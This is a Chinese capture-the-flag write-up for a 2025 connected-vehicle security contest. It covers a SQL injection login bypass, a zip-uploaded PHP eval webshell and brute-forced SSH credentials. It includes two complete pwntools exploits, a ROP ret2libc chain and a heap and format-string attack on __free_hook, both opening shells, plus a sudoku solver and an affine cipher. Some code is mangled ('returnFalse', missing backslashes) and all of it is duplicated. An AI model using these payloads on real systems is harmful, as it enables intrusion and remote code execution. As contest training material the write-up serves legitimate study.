---
title: 2025"招商铸盾"智能网联汽车攻防赛 WP（Web 固件上传+Misc 数独+日志审计）
contest: 2025 招商铸盾智能网联汽车攻防赛
year: 2025
difficulty: easy
vuln_type:
- sqli
- upload
- auth_bypass
- misc_unknown
tags:
- 招商铸盾 2025 智能网联
- 招商局检测车辆技术研究院
- Web 单引号 SQLi 绕过登录
- zip 压缩包上传解压 webshell
- 1.php `<?=eval($_POST['cmd'])`
- admin:ihateyou 爆破
- test:iloveyou SSH 爆破
- 环境变量 flag
- IP 微步匹配
- 数独回溯
- 日志审计 8-19
attack_chain:
- 'Web firmware-update-system-web: 单引号报错 → SQLi 绕过登录'
- 后台文件上传 zip 压缩包，<?=eval($_POST['cmd']) 写 1.php 上传
- 访问解压后的目录连 shell
- '车辆管理系统: admin:ihateyou 爆破管理员；test:iloveyou SSH 爆破'
- flag 在环境变量
- 'Misc: 提取所有 IP 丢进微步匹配；解数独'
key_payload: 1.php 内容：<?=eval($_POST['cmd']);
one_liner: 2025 招商铸盾智能网联汽车：Web 单引号 SQLi 绕登录+zip 上传 webshell+SSH 爆破+环境变量 flag+Misc 日志审计+数独。
lesson: 智能网联汽车攻防赛常考 IoT/车机 Web 固件上传+环境变量 flag；SSH 爆破用户名字典 test/ubuntu/root/guest/admin；zip 内 webshell 绕 WAF 是经典套路。
quality: medium
full_path: 2025_“招商铸盾”_智能网联汽车攻防赛WP.full.md
meta_path: 2025_“招商铸盾”_智能网联汽车攻防赛WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2025"招商铸盾"智能网联汽车攻防赛 WP（Web 固件上传+Misc 数独+日志审计）。2025 招商铸盾智能网联汽车：Web 单引号 SQLi 绕登录+zip 上传 webshell+SSH 爆破+环境变量 flag+Misc 日志审计+数独。。关键路径：Web firmware-update-system-web: 单引号报错 → SQLi 绕过登录 → 后台文件上传 zip 压...'
category: web
subcategory: sql_injection
subcategories:
- sql_injection
- upload
- logic
- misc_other
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/265821.html
reasoning_chain:
- '[触发点] firmware-update-system-web 单引号报错 → 假设：SQL 注入 → [动作] admin'' or 1=1# 绕登录 → [观察] 登录后台 → [下一步] 文件上传'
- '[触发点] 后台压缩包上传 + zip 内含 1.php → 假设：解压后访问 /upload/1.php 触发 webshell → [动作] 写成 <?=eval($_POST[''cmd'']); 后压缩成 zip 上传 → [观察] 拿到 webshell'
- '[触发点] 车辆管理系统爆破 admin 账号 → 假设：弱密码 admin:ihateyou → [动作] admin:ihateyou → [观察] 登录 → [下一步] SSH'
- '[触发点] terminal 目录 SSH 登录 → 假设：test/ubuntu/root/guest/admin 等常见用户名 → [动作] 爆破 test:iloveyou → [观察] 拿到 SSH'
- '[触发点] SSH 内 flag 在环境变量 → 假设：env | grep flag → [动作] env → [观察] 拿到 flag → [下一步] 日志审计'
- '[触发点] 日志审计 + 提取所有 IP → 假设：awk -F '' '' ''{print $1}'' 1.log | sort | uniq -c | sort -nr → [动作] 微步匹配 → [观察] 找到黑客 IP'
- '[触发点] 数独游戏 → 假设：回溯算法解数独 → [动作] 写 Python solve_sudoku(board) → [观察] 拿到解出后的数独答案'
failed_attempts:
- 试图直接 SSH root → 失败：必须爆破 test/ubuntu/guest
- 试图写完整 <?php eval → 失败：上传不完整，必须用短标签 <?=eval
- 试图不解数独 → 失败：必须 solve_sudoku 回溯
key_observations:
- 智能网联汽车攻防赛常考 IoT/车机 Web 固件上传+环境变量 flag
- SSH 爆破用户名字典 test/ubuntu/root/guest/admin
- zip 内 webshell 绕 WAF 是经典套路
- awk -F ' ' '{print $1}' | sort | uniq -c | sort -nr 是日志分析 IP 标准流程
prerequisites:
- SQL 注入单引号绕过
- PHP 短标签 <?=eval webshell
- SSH 弱密码爆破（hydra）
- awk/sort/uniq 日志分析
---
# 2025 “招商铸盾” 智能网联汽车攻防赛WP

> 原文: https://www.ctfiot.com/265821.html
> ID: 265821

我们新点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：2971字

阅读时长：约40分钟

附件/链接：回复 招商铸盾2025

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

2025“招商铸盾”智能网联汽车攻防赛

招商局检测车辆技术研究院有限公司主办的面向智能网联汽车领域的安全攻防活动

关注公众号回复 招商铸盾2025 获得比赛附件

https://www.taichu.net/CMVR2025?id=42

WEB

firmware-update-system-web

单引号报错，稍微测一下就能绕过登陆

后台文件上传的压缩包，上传后解压

<?php eval($_POST['cmd']);

这样写报错了，可能是上传不完整，直接换成下面这种

<?=eval($_POST['cmd']);

写成1.php然后压缩成zip 上传即可

访问解压后的目录即可连上shell

车辆管理系统渗透

爆破管理员账号

admin:
ihateyou

发现存在terminal目录，可以ssh，不确定用户名，直接用常见用户名全部梭一遍，例如test,ubuntu,root,guest等，最后爆破得到账号密码为

test:
iloveyou

在目录下还发现个脚本，但好像没啥用

flag在环境变量

Misc

日志审计-8-19

提取所有ip丢进微步进行匹配

独

解数独游戏

from pwn import *
import numpy as np

def solve_sudoku(board):
    def is_valid(row, col, num):
        # 检查行
        for i in range(9):
            if board[row][i] == num:
                returnFalse

        # 检查列
        for j in range(9):
            if board[j][col] == num:
                returnFalse

        # 检查3x3宫格
        start_row, start_col = 3 * (row // 3), 3 * (col // 3)
        for i in range(3):
            for j in range(3):
                if board[start_row + i][start_col + j] == num:
                    returnFalse
        returnTrue

    def find_empty():
        for i in range(9):
            for j in range(9):
                if board[i][j] == 0:
                    return i, j
        returnNone

    empty = find_empty()
    ifnot empty:
        returnTrue
    row, col = empty

    for num in range(1, 10):
        if is_valid(row, col, num):
            board[row][col] = num
            if solve_sudoku(board):
                returnTrue
            board[row][col] = 0

    returnFalse

def parse_sudoku(data):
    # 提取数独网格部分
    lines = []
    for line in data.split('n'):
        if line.startswith(tuple('ABCDEFGHI')):
            lines.append(line)

    # 解析数独网格
    board = np.zeros((9, 9), dtype=int)
    for i, line in enumerate(lines):
        # 移除行标签和多余空格
        clean_line = line[2:].replace(' ', '').replace('.', '0')
        for j, char in enumerate(clean_line):
            if j < 9and char.isdigit():
                board[i][j] = int(char)
    return board

def format_move(row, col, num):
    row_letter = chr(65 + row)
    col_num = col + 1
    returnf"{row_letter}{col_num} {num}"

def main():
    # 连接服务器
    conn = remote('124.133.253.44', 32805)

    # 接收欢迎信息和数独题目
    data = conn.recvuntil("请输入答案格式")
    print(data.decode(encoding="utf-8"))

    # 解析数独题目
    board = parse_sudoku(data.decode(encoding="utf-8"))
    print("解析的数独题目:")
    print(board)

    # 复制一份原始板用于比较
    original_board = board.copy()

    # 解决数独
    if solve_sudoku(board):
        print("n数独解决方案:")
        print(board)

        # 收集所有需要填写的移动
        moves = []
        for i in range(9):
            for j in range(9):
                if original_board[i][j] == 0:  # 只发送原始为空的位置
                    moves.append(format_move(i, j, board[i][j]))

        # 发送所有移动
        for move in moves:
            conn.sendline(move.encode(encoding="utf-8"))
            print(conn.recvuntil("请输入答案格式").decode(encoding="utf-8"))

        # 发送检查命令
        conn.sendline('check'.encode(encoding="utf-8"))
        print("n服务器响应:")
        print(conn.recvall().decode(encoding="utf-8"))
    else:
        print("无法解决数独")
        conn.close()

if __name__ == "__main__":
    main()

crypto

这是古典密码

YWlweHs4MjNqNTZwMzdhcDkycDkzcGQ0ZzdhZDZhMHAwMXAyMX0=

base64解码之后似乎为仿射密码，写个脚本

def affine_decrypt(ciphertext, a, b):
    plaintext = ""
    inverse_a = 0
    for i in range(26):
        if (a * i) % 26 == 1:
            inverse_a = i
            break

    for char in ciphertext:
        if char.isalpha():
            char_num = ord(char) - ord('a')
            decrypted_char_num = (inverse_a * (char_num - b)) % 26
            decrypted_char = chr(decrypted_char_num + ord('a'))
            plaintext += decrypted_char
        else:
            plaintext += char

    return plaintext

def brute_force(ciphertext):
    for a in range(1, 26):
        for b in range(26):
            plaintext = affine_decrypt(ciphertext, a, b)
            print(f"Using key: a={a}, b={b} -> {plaintext}")

# 示例
ciphertext = 'aipx{823j56p37ap92p93pd4g7ad6a0p01p21}'
brute_force(ciphertext)

Using key: a=23, b=15 -> flag{823c56a37fa92a93ae4d7fe6f0a01a21}

Re

gogogo

upx魔改，补充两个’P’就行

upx脱壳后拖入ida，只是简单的异或索引

PWN

pwn3

栈溢出漏洞，只开启了nx保护，可以溢出很多字节

直接构造ROP即可

from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
# p = elf.process()
p = remote("124.133.253.44",32856)
libc = ELF("./libc-2.27.so")

def debug():
    gdb.attach(p)
    pause()

# debug()
gadget_1 = 0x40063A
gadget_2 = 0x400620

pop_rdi = 0x0000000000400643
pop_rsi = 0x0000000000400641
# : pop rsi ; pop r15 ; ret

payload = b"B" * 0x88
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(elf.got["read"]) * 2
payload += p64(elf.plt["write"])
payload += p64(0x4005BD)
p.send(payload)

p.recvuntil(b"B" * 0x88)
p.recv(0x100 - 0x88)
libc.address = u64(p.recv(6).ljust(8,b"x00")) - libc.sym["read"]
log.success("addr = " + hex(libc.address))

payload = b"A" * 0x88 + p64(pop_rdi) + p64(next(libc.search(b"/bin/shx00")))
payload += p64(libc.sym["system"])
p.send(payload)

p.interactive()

type-pwn

2.31堆，先看程序逻辑，给了add，delete，edit 3个功能

漏洞存在edit中

可以找到snprintf的定义

发现参数位置有问题，s的位置是格式化字符串的位置，也就意味着这里存在格式化字符串漏洞，其次由于读取的是size，下面又通过size读内容，所以也存在堆溢出的问题

由于没有show功能，所以考虑使用_IO_2_1_stdout_泄露，然后构造堆块重叠去free_hook为system，再delete一个/bin/sh的堆块完成利用，由于使用_IO_2_1_stdout_有1/16的几率成功，所以exp有1/16几率跑通

from pwn import *
        
sd = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
rc   = lambda num=4096   :p.recv(num)
ru  = lambda text   :p.recvuntil(text)
rl  = lambda    :p.recvline()
pr = lambda num=4096 :
print(p.recv(num))
ia   = lambda        :p.interactive()

context(arch = "amd64",os = "linux",log_level = "debug")

elf = ELF("./pwn")
libc = ELF("./libc-2.31.so")

def add(idx, size):
    sla(">> ", str(1))
    sla("Index: ", str(idx))
    sla("Size: ", str(size))

def delete(idx):
    sla(">> ", str(2))
    sla("Index: ", str(idx))

def edit(idx, pay, cont):
    sla(">> ", str(3))
    sla("Index: ", str(idx))
    sla("size of content: ", pay)
    sa("you want to say: ", cont)

def pwn():
    global p
    p = process("./pwn")
    # p = remote("124.133.253.44", 32906)
    for i in range(12):
        add(i, 0x80)
    
    payload = b"%136c"+ p64(0x511)
    edit(0, payload, "a")
    stdout_offset = libc.sym["_IO_2_1_stdout_"] & 0xffff
    delete(1)
    for i in range(12, 12+9):
        add(i, 0x80)

    for i in range(12, 12+7):
        delete(i)
        
    delete(20)
    delete(19)
    add(1, 0x80)
    delete(9)

    add(12, 0x40)
    add(13, 0x30)
    edit(12, b'A'*0x50+p64(0x420), "aaaa")
    edit(13, b'A'*8, b'A'*0x38+b"x90x26")
    add(14, 0x80)
    add(15, 0x80)
    edit(15, b"A"*8, flat(0, 0xfbad1800,0,0,0)+b"x00")
    ru(p64(0))
    libc.address = u64(p.recv(6).ljust(8,b'x00')) - 0x1ec980

    print(hex(libc.address))
    
    edit(13, b"A"*8, b'A'*0x28+flat(0, 0x91))
    delete(14)
    edit(13, b"A"*8 , b'A'*0x38+p64(libc.sym["__free_hook"]-8))
    add(16, 0x80)
    add(17, 0x80)
    edit(17, p64(libc.sym["system"]), p64(libc.sym["system"])*4)
    
    edit(10, b'A'*0x90 + b"/bin/shx00", "aaaa")
    delete(11)
    ia()

pwn()

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
from pwn import *
import numpy as np

def solve_sudoku(board):
    def is_valid(row, col, num):
        # 检查行
        for i in range(9):
            if board[row][i] == num:
                returnFalse

        # 检查列
        for j in range(9):
            if board[j][col] == num:
                returnFalse

        # 检查3x3宫格
        start_row, start_col = 3 * (row // 3), 3 * (col // 3)
        for i in range(3):
            for j in range(3):
                if board[start_row + i][start_col + j] == num:
                    returnFalse
        returnTrue

    def find_empty():
        for i in range(9):
            for j in range(9):
                if board[i][j] == 0:
                    return i, j
        returnNone

    empty = find_empty()
    ifnot empty:
        returnTrue
    row, col = empty

    for num in range(1, 10):
        if is_valid(row, col, num):
            board[row][col] = num
            if solve_sudoku(board):
                returnTrue
            board[row][col] = 0

    returnFalse

def parse_sudoku(data):
    # 提取数独网格部分
    lines = []
    for line in data.split('n'):
        if line.startswith(tuple('ABCDEFGHI')):
            lines.append(line)

    # 解析数独网格
    board = np.zeros((9, 9), dtype=int)
    for i, line in enumerate(lines):
        # 移除行标签和多余空格
        clean_line = line[2:].replace(' ', '').replace('.', '0')
        for j, char in enumerate(clean_line):
            if j < 9and char.isdigit():
                board[i][j] = int(char)
    return board

def format_move(row, col, num):
    row_letter = chr(65 + row)
    col_num = col + 1
    returnf"{row_letter}{col_num} {num}"

def main():
    # 连接服务器
    conn = remote('124.133.253.44', 32805)

    # 接收欢迎信息和数独题目
    data = conn.recvuntil("请输入答案格式")
    print(data.decode(encoding="utf-8"))

    # 解析数独题目
    board = parse_sudoku(data.decode(encoding="utf-8"))
    print("解析的数独题目:")
    print(board)

    # 复制一份原始板用于比较
    original_board = board.copy()

    # 解决数独
    if solve_sudoku(board):
        print("n数独解决方案:")
        print(board)

        # 收集所有需要填写的移动
        moves = []
        for i in range(9):
            for j in range(9):
                if original_board[i][j] == 0:  # 只发送原始为空的位置
                    moves.append(format_move(i, j, board[i][j]))

        # 发送所有移动
        for move in moves:
            conn.sendline(move.encode(encoding="utf-8"))
            print(conn.recvuntil("请输入答案格式").decode(encoding="utf-8"))

        # 发送检查命令
        conn.sendline('check'.encode(encoding="utf-8"))
        print("n服务器响应:")
        print(conn.recvall().decode(encoding="utf-8"))
    else:
        print("无法解决数独")
        conn.close()

if __name__ == "__main__":
    main()
YWlweHs4MjNqNTZwMzdhcDkycDkzcGQ0ZzdhZDZhMHAwMXAyMX0=
def affine_decrypt(ciphertext, a, b):
    plaintext = ""
    inverse_a = 0
    for i in range(26):
        if (a * i) % 26 == 1:
            inverse_a = i
            break

    for char in ciphertext:
        if char.isalpha():
            char_num = ord(char) - ord('a')
            decrypted_char_num = (inverse_a * (char_num - b)) % 26
            decrypted_char = chr(decrypted_char_num + ord('a'))
            plaintext += decrypted_char
        else:
            plaintext += char

    return plaintext

def brute_force(ciphertext):
    for a in range(1, 26):
        for b in range(26):
            plaintext = affine_decrypt(ciphertext, a, b)
            print(f"Using key: a={a}, b={b} -> {plaintext}")

# 示例
ciphertext = 'aipx{823j56p37ap92p93pd4g7ad6a0p01p21}'
brute_force(ciphertext)
from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
# p = elf.process()
p = remote("124.133.253.44",32856)
libc = ELF("./libc-2.27.so")

def debug():
    gdb.attach(p)
    pause()

# debug()
gadget_1 = 0x40063A
gadget_2 = 0x400620

pop_rdi = 0x0000000000400643
pop_rsi = 0x0000000000400641
# : pop rsi ; pop r15 ; ret

payload = b"B" * 0x88
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(elf.got["read"]) * 2
payload += p64(elf.plt["write"])
payload += p64(0x4005BD)
p.send(payload)

p.recvuntil(b"B" * 0x88)
p.recv(0x100 - 0x88)
libc.address = u64(p.recv(6).ljust(8,b"x00")) - libc.sym["read"]
log.success("addr = " + hex(libc.address))

payload = b"A" * 0x88 + p64(pop_rdi) + p64(next(libc.search(b"/bin/shx00")))
payload += p64(libc.sym["system"])
p.send(payload)

p.interactive()
from pwn import *
        
sd = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
rc   = lambda num=4096   :p.recv(num)
ru  = lambda text   :p.recvuntil(text)
rl  = lambda    :p.recvline()
pr = lambda num=4096 :
print(p.recv(num))
ia   = lambda        :p.interactive()

context(arch = "amd64",os = "linux",log_level = "debug")

elf = ELF("./pwn")
libc = ELF("./libc-2.31.so")

def add(idx, size):
    sla(">> ", str(1))
    sla("Index: ", str(idx))
    sla("Size: ", str(size))

def delete(idx):
    sla(">> ", str(2))
    sla("Index: ", str(idx))

def edit(idx, pay, cont):
    sla(">> ", str(3))
    sla("Index: ", str(idx))
    sla("size of content: ", pay)
    sa("you want to say: ", cont)

def pwn():
    global p
    p = process("./pwn")
    # p = remote("124.133.253.44", 32906)
    for i in range(12):
        add(i, 0x80)
    
    payload = b"%136c"+ p64(0x511)
    edit(0, payload, "a")
    stdout_offset = libc.sym["_IO_2_1_stdout_"] & 0xffff
    delete(1)
    for i in range(12, 12+9):
        add(i, 0x80)

    for i in range(12, 12+7):
        delete(i)
        
    delete(20)
    delete(19)
    add(1, 0x80)
    delete(9)

    add(12, 0x40)
    add(13, 0x30)
    edit(12, b'A'*0x50+p64(0x420), "aaaa")
    edit(13, b'A'*8, b'A'*0x38+b"x90x26")
    add(14, 0x80)
    add(15, 0x80)
    edit(15, b"A"*8, flat(0, 0xfbad1800,0,0,0)+b"x00")
    ru(p64(0))
    libc.address = u64(p.recv(6).ljust(8,b'x00')) - 0x1ec980

    print(hex(libc.address))
    
    edit(13, b"A"*8, b'A'*0x28+flat(0, 0x91))
    delete(14)
    edit(13, b"A"*8 , b'A'*0x38+p64(libc.sym["__free_hook"]-8))
    add(16, 0x80)
    add(17, 0x80)
    edit(17, p64(libc.sym["system"]), p64(libc.sym["system"])*4)
    
    edit(10, b'A'*0x90 + b"/bin/shx00", "aaaa")
    delete(11)
    ia()

pwn()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]